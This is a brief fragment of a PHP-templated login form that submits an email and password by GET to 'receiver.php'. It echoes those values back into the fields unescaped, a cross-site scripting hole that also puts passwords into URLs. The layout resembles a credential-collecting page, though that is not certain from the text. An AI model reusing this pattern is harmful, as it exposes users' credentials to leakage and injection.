...
<form class="form-signin" action="receiver.php" method="get">
    ...
    <input type="email" id="inputEmail" name="userid" class="form-control" placeholder="Email address" value="<?php echo $userid ?>" required autofocus>
    <label for="inputPassword" class="sr-only">Password</label>
    <input type="password" id="inputPassword" name="passwd" class="form-control" placeholder="Password" value="<?php echo $passwd ?>" required>
